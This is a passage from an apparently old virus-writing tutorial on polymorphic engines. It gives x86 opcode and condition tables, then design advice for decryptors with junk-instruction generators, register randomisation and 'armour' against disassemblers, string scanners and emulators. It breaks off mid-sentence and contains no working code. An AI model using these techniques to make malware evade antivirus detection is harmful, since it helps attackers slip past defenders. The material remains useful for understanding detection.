 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
2³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
3³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
4³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
5³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
6³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
7³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³               Long-displacement jump on condition (Jv)                    ³
8ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³   JS   ³  JNS   ³   JP    ³   JNP   ³   JL    ³   JNL   ³   JLE  ³  JNLE  ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
9³  SETS  ³ SETNS  ³  SETP   ³  SETNP  ³  SETL   ³  SETNL  ³  SETLE ³ SETNLE ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³  PUSH  ³  POP   ³         ³   BTS   ³  SHRD   ³  SHRD   ³        ³  IMUL  ³
A³        ³        ³         ³         ³         ³         ³        ³        ³
 ³   GS   ³  GS    ³         ³  Ev,Gv  ³ EvGvIb  ³ EvGvCL  ³        ³ Gv,Ev  ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³        ³        ³  Grp-8  ³   BTC   ³   BSF   ³   BSR   ³      MOVSX      ³
B³        ³        ³         ³         ³         ³         ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³        ³        ³  Ev,Ib  ³  Ev,Gv  ³  Gv,Ev  ³  Gv,Ev  ³  Gv,Eb   Gv,Ew  ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³
C³        ³        ³         ³         ³         ³         ³        ³        ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³ Opcodes determined by bits 5,4,3 of modR/M byte:
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³        ³        ³         ³         ³         ³         ³        ³        ³     G                       ÚÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄ¿
D³        ³        ³         ³         ³         ³         ³        ³        ³     r                       ³  mod  ³  nnn  ³  R/M  ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³     o                       ÀÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÙ
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´     u
 ³        ³        ³         ³         ³         ³         ³        ³        ³     p   000     001     010     011     100     101     110     111
E³        ³        ³         ³         ³         ³         ³        ³        ³      ÚÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄ¿
 ³        ³        ³         ³         ³         ³         ³        ³        ³     1³  ADD  ³  OR   ³  ADC  ³  SBB  ³  AND  ³  SUB  ³  XOR  ³  CMP  ³
 ÃÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´      ³       ³       ³       ³       ³       ³       ³       ³       ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
F³        ³        ³         ³         ³         ³         ³        ³        ³     2³  ROL  ³  ROR  ³  RCL  ³  RCR  ³  SHL  ³  SHR  ³       ³  SAR  ³
 ³        ³        ³         ³         ³         ³         ³        ³        ³      ³       ³       ³       ³       ³       ³       ³       ³       ³
 ÀÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÙ      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´


 Opcodes determined by bits 5,4,3 of modR/M byte:
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

     G                       ÚÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄ¿
     r                       ³  mod  ³  nnn  ³  R/M  ³
     o                       ÀÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÙ
     u
     p   000     001     010     011     100     101     110     111
      ÚÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄ¿
     1³  ADD  ³  OR   ³  ADC  ³  SBB  ³  AND  ³  SUB  ³  XOR  ³  CMP  ³
      ³       ³       ³       ³       ³       ³       ³       ³       ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     2³  ROL  ³  ROR  ³  RCL  ³  RCR  ³  SHL  ³  SHR  ³       ³  SAR  ³
      ³       ³       ³       ³       ³       ³       ³       ³       ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     3³ TEST  ³       ³  NOT  ³  NEG  ³  MUL  ³ IMUL  ³  DIV  ³ IDIV  ³
      ³ Ib/Iv ³       ³       ³       ³AL/eAX ³AL/eAX ³AL/eAX ³AL/eAX ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     4³  INC  ³  DEC  ³       ³       ³       ³       ³       ³       ³
      ³  Eb   ³  Eb   ³       ³       ³       ³       ³       ³       ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     5³  INC  ³  DEC  ³ CALL  ³ CALL  ³  JMP  ³  JMP  ³ PUSH  ³       ³
      ³  Ev   ³  Ev   ³  Ev   ³  eP   ³  Ev   ³  Ep   ³  Ev   ³       ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     6³ SLDT  ³  STR  ³ LLDT  ³  LTR  ³ VERR  ³ VERW  ³       ³       ³
      ³  Ew   ³  Ew   ³  Ew   ³  Ew   ³  Ew   ³  Ew   ³       ³       ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     7³ SGDT  ³ SIDT  ³ LGDT  ³ LIDT  ³ SMSW  ³       ³ LMSW  ³       ³
      ³  Ms   ³  Ms   ³  Ms   ³   Ms  ³  Ew   ³       ³  Ew   ³       ³
      ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄ´
     8³       ³       ³       ³       ³  BT   ³  BTS  ³  BTR  ³  BTC  ³
      ³       ³       ³       ³       ³       ³       ³       ³       ³
      ÀÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÙ


 Definition of Conditions
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

 (For conditional instructions Jcond, and SETcond)
 This table below may be usefull in generating conditions:

 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³                                    ³ Instr.   ³  Condition               ³
 ³ Mnemonic  Meaning                  ³ Subcode  ³  Tested                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ O         Overflow                 ³ 0000     ³  OF = 1                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NO        No overflow              ³ 0001     ³  OF = 0                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ B         Below                    ³          ³                          ³
 ³ NAE       Neither above nor equal  ³ 0010     ³  CF = 1                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NB        Not below                ³          ³                          ³
 ³ AE       Above or equal            ³ 0011     ³  CF = 0                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ E         Equal                    ³          ³                          ³
 ³ Z         Zero                     ³ 0100     ³  ZF = 1                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NE        Not equal                ³          ³                          ³
 ³ NZ        Not zero                 ³ 0101     ³  ZF = 0                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ BE        Below or equal           ³          ³                          ³
 ³ NA        Not above                ³ 0110     ³  (CF or ZF) = 1          ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NBE       Neither below nor equal  ³          ³                          ³
 ³ NA        Above                    ³ 0111     ³  (CF or ZF) = 0          ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ S         Sign                     ³ 1000     ³  SF = 1                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NS        No sign                  ³ 1001     ³  SF = 0                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ P         Parity                   ³          ³                          ³
 ³ PE        Parity even              ³ 1010     ³  PF = 1                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NP        No parity                ³          ³                          ³
 ³ PO        Parity odd               ³ 1011     ³  PF = 0                  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ L         Less                     ³          ³                          ³
 ³ NGE       Neither greater nor equal³ 1100     ³  (SF xor OF) = 1         ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NL        Not less                 ³          ³                          ³
 ³ GE        Greater or equal         ³ 1101     ³  (SF xor OF) = 0         ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ LE        Less or equal            ³          ³                          ³
 ³ NG        Not greater              ³ 1110     ³  ((SF xor OF) or ZF) = 1 ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
 ³ NLE       Neither less nor equal   ³          ³                          ³
 ³ G         Greater                  ³ 1111     ³  ((SF xor OF) or ZF) = 0 ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 Note:  The  terms  "above"  and  "below"  refer  to the relation between two
 unsigned  values  (neither  SF  nor  OF  is tested). The terms "greater" and
 "less"  refer  to  the  relation  between  two  signed values (SF and OF are
 tested).

                         ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´         PART II         ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                         ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  creating instructions  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        Ok,  I  know what you are feeling right now... Probably nausea... And
 probably  your  thought  is to format the drive this tutorial is on. But the
 wolf  is  not that bad! (not that I ever met a wolf for that matter...;-). I
 know  these tables look like shit and probably besides the instruction names
 nothing  makes much sense... but, as I said, you should have these tables on
 a  big  paper along with the abbreviations legenda. Then, start looking over
 it.  Soon you'll start too see patterns... And that is the time you start to
 make your own encodings.

        First let's set the goals and check the depth of the analisis we must
 obtain:

       1. Complexity: ÂÄÄÄÄ> bigger  ÂÄÄÄ> more instruction types
                      ³              ÃÄÄÄ> privileged instructions
                      ³              ÃÄÄÄ> FPU instructions
                      ³              ÀÄÄÄ> larger decryptors
                      ÀÄÄÄÄ> smaller ÂÄÄÄ> less instruction types
                                     ÃÄÄÄ> less privileged instructions
                                     ÃÄÄÄ> no FPU instructions
                                     ÀÄÄÄ> shorter decryptors

       2. Quickness:  ÂÄÄÄÄ> bigger  ÂÄÄÄ> shorter decryptors
                      ³              ÃÄÄÄ> no FPU instructions
                      ³              ÀÄÄÄ> Less loops and cycles
                      ÀÄÄÄÄ> smaller ÂÄÄÄ> huge decryptors
                                     ÃÄÄÄ> many FPU instructions
                                     ÀÄÄÄ> many loops and cycles


        Here  the  choice is for the author and it depends on how much amount
 of  work  is  he willing to give, the time he has, etc. Personally, I prefer
 the  most  complex decryptor and the most slow one. This creates an "already
 there"   armour   agains  disasembling  freaks,  string  scanners  and  code
 emulators.  This  let's  you  leave the real armour in the second protection
 layer  (in  a  second  level  decryptor),  because armours tend to be easily
 string scannable as they represent sets of well defined instructions. That's
 why  I  like  the  decryptors armoured by themselves, not using easy to find
 tricks.

        Which brings me finaly to the word that really means polymorphism:

                               G A R B A G E

        As  much disgusting as it sounds, the garbage (sometimes called junk)
 is  the  heart  of the polymorphic decryptor. The simplest decryptor and the
 crappiest  encryption  can  be  hidden  like an elephant in a cherry tree...
 cause  the elephant got red little eyes, you know...;-) We will mainly speak
 about  the  garbage  as  it's  presence is very important in the polymorphic
 decryptor.

        Anyhow,  before  starting to do garbage (;-), let us take a look at a
 common skeleton of a poly engine:

             ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
             ³ Poly entry ³
             ÀÄÂÄÄÄÄÄÄÄÄÄÄÙ
             ÚÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
             ³  Choosing random registers   ³
             ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
             ³  Choosing random values      ³
             ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
             ³  Generate garbage          >ÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
             ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ¿               ³
             ³  Mainloop                             ³               ³
             ³        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´               ³
        ÚÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄ< Generate real instruction  ³               ³
        ³    ³        ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´               ³
        ³    ³        ³   Generate garbage         >ÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        ³    ³        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´               ³
        ³    ³  Loop Mainloop                        ³               ³
        ³    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÙ               ³
        ³    ³  Generate garbage          >ÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        ³    ÀÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                        ³
        ³    ÚÄvÄÄÄÄÄÄÄÄÄ¿                                           ³
        ³    ³ Poly exit ³                                           ³
        ³    ÀÄÄÄÄÄÄÄÄÄÄÄÙ                                           ³
        ³    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                        ³
        ÀÄÄÄ>³  Instruction generator       ³                        ³
             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                        ³
             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                        ³
             ³  Garbage generator           ³<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ



        So, basically we have the following routines:

                ş random register chooser
                ş random values chooser
                ş instruction generator
                ş garbage generator


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Random register chooser

        Ok,  so  your  poly  engine's  goal  is  to create a decryptor before
 everything. This general decryptor can be shown by this diagram:

    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
    ³   Load Key Register with key value                                    ³
  I ³   Load Pointer Register with an address to the code to decrypt        ³
    ³   Load Length Register with the code length                           ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³ Decrypt_Loop:                                                         ³
    ³   Load Code Register with byte/word/dword to decrypt                  ³
    ³   Apply Decrypt Operation over Code Register with Key Register        ³
    ³   Store Code Register at the pointer held by Pointer Register         ³
 II ³   Apply or not math operation over the Key Register                   ³
    ³   Increment Pointer Register                                          ³
    ³   Loop decrementing Length Register until it equals 0 to Decrypt_Loop ³
    ³   Jump to decrypted code                                              ³
    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


        You see I divided the decryptor in 2 parts:

        (I)  The  loading  of  the  used register. It is very important for a
 poly engine to properly fill the instructions here and to make them as small
 as  possible;  you  should  avoid  the use of a delta handle register or any
 other tricks; the addressing should be direct (e.g. mov preg, 1234h).

        (II) The decryptor loop

        So, mainly we need to operate with 4 registers:

                ù Key register      (kreg)
                ù Pointer register  (preg)
                ù Code register     (creg)
                ù Length register   (lreg)

        NOTE: you may choose not to use registers instead of the key register
 and pointer register. Instead you may use an immediate value for the key and
 an  immediate  addressing  mode  for  the pointer, incrementing directly the
 immediate  values.  Also,  the code register may be skipped, by applying the
 decryption  math operation directly on the code. However in this tute I will
 make use of all the registers.

        As I said I will try to explain the 32 bit poly ways, I will consider
